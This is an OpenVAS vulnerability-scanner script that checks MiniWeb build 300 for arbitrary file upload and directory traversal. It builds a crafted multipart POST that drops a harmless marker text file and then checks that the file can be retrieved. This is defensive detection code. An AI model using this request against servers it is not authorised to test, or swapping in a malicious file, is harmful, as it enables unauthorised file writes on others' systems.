###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_miniweb_file_upload_n_dir_trav_vuln.nasl 11401 2018-09-15 08:45:50Z cfischer $
#
# MiniWeb Arbitrary File Upload and Directory Traversal Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803477");
  script_version("$Revision: 11401 $");
  script_bugtraq_id(58946);
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-04-17 18:42:05 +0530 (Wed, 17 Apr 2013)");
  script_name("MiniWeb Arbitrary File Upload and Directory Traversal Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with MiniWeb and is prone to file upload
  and directory traversal vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP POST request and check whether it is able to upload
  arbirary file or not.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"insight", value:"Flaw is due to improper sanitation of user supplied input via the 'filename'
  parameter and uploading a file to a non existing directory.");

  script_tag(name:"affected", value:"MiniWeb (build 300, built on Feb 28 2013)");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to overwrite legitimate
  content and upload files to arbitrary locations outside of the web path.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_xref(name:"URL", value:"http://secunia.com/advisories/52923");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/121168");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/52923");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_require_ports("Services/www", 8000);
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("misc_func.inc");
include("http_keepalive.inc");

function create_upload_req(url, file, host)
{
  postData = string(
  '------WebKitFormBoundarybzq9yiXANBqlqUBo\r\n',
  'Content-Disposition: form-data; name="user"\r\n\r\n',
  'Username\r\n',
  '------WebKitFormBoundarybzq9yiXANBqlqUBo\r\n',
  'Content-Disposition: form-data; name="pass"\r\n\r\n',
  'Password\r\n',
  '------WebKitFormBoundarybzq9yiXANBqlqUBo\r\n',
  'Content-Disposition: form-data; name="file"; filename="' + file + '"\r\n',
  'Content-Type: text/plain\r\n\r\n',
  'File-Upload-Vulnerability-Test\r\n\r\n',
  '------WebKitFormBoundarybzq9yiXANBqlqUBo\r\n',
  'Content-Disposition: form-data; name="button"\r\n\r\n',
  'Upload\r\n',
  '------WebKitFormBoundarybzq9yiXANBqlqUBo--\r\n');

  return string(
  "POST ", url, " HTTP/1.1\r\n",
  "Host: ", get_host_name(), "\r\n",
  "Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybzq9yiXANBqlqUBo\r\n",
  "Content-Length: ", strlen(postData),
  "\r\n\r\n", postData
  );
}

port = get_http_port(default:8000);
host = http_host_name(port:port);

url = "/AAAAAAAAAAAAAAAAAAAAA";
file = string("ov-upload-test-", rand_str(length:5), ".txt");
req = create_upload_req(url:url, file:file, host:host);
http_keepalive_send_recv(port:port, data: req);

if(http_vuln_check(port:port, url:string("/", file), check_header:TRUE,
          pattern:"File-Upload-Vulnerability-Test"))
{
  msg = 'Scanner has created a file ' + file + ' to check the vulnerability.' +
        ' Please remove this file as soon as possible.';
  security_message(port:port, data:msg);
  exit(0);
}
